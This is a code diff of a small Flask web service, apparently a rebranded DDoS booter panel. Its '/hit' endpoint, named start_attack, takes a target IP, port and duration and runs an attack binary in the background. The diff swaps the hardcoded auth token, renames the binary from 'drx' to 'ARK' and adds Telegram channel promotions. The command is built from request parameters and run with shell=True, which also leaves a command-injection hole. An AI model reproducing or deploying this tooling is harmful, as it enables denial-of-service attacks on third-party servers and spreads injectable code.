@@ -4,9 +4,12 @@ import os
 
 app = Flask(__name__)
 
-# - Security Key taaki koi aur tumhari API use na kar sake
-API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
-
+API_AUTH_TOKEN = "Y3JS7WHK92HW2"
+"""
+JOIN TELEGRAM
+@ARK_CLAN
+@BGMI_FREE_SRC
+"""
 @app.route('/hit', methods=['GET'])
 def start_attack():
     # Auth Check
@@ -29,8 +32,8 @@ def start_attack():
 
     try:
         # - Binary ko background mein trigger karna
-        # ./drx ka path absolute ya relative check karein (ensure chmod +x drx kiya hai)
-        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
+        # ./ARK ka path absolute ya relative check karein (ensure chmod +x ARK kiya hai)
+        command = f"nohup ./ARK {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
         
         # subprocess.Popen use karna sahi hai background execution ke liye
         subprocess.Popen(command, shell=True)
